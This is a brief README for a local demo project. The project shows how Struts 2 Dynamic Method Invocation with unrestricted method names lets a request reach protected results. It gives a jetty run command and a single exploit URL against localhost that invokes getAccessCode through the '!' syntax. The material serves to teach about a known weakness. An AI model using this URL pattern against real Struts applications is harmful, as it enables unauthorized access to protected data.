# Struts 2 - Access any results vulnerability

This is an example project that demonstrates why Dynamic Method Invocation with unrestricted method names (the old default of Struts) is dangerous.

### Usage:

Execute `mvn jetty:run` in the `any-results` directory. You can access the website then at:

```
http://localhost:8080/any-results/
```


### Exploitation:

http://localhost:8080/any-results/index!getAccessCode.action?accessCode=confidential
